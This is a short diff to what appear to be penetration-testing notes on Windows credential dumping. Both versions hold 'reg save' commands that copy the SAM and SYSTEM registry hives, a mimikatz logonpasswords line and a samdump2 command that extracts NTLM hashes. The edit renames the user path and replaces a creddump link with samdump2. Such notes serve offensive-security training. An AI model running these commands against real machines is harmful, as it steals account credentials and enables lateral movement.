@@ -67,11 +67,11 @@ mimikatz # sekurlsa::logonpasswords
 We can also copy sam and system file from reg key
 
 ```
-C:\> reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
-C:\> reg save HKLM\system C:\users\offsec.corp1\Downloads\system
+C:\> reg save HKLM\sam C:\users\userA\Downloads\sam
+C:\> reg save HKLM\system C:\users\userA\Downloads\system
 ```
 
-Now we can decrypt and dump NTLM hash with [creddump.py](https://github.com/CiscoCXSecurity/creddump7)
+Now we can decrypt and dump NTLM hash with samdump
 ```
 samdump2 ~/system ~/sam
 ```
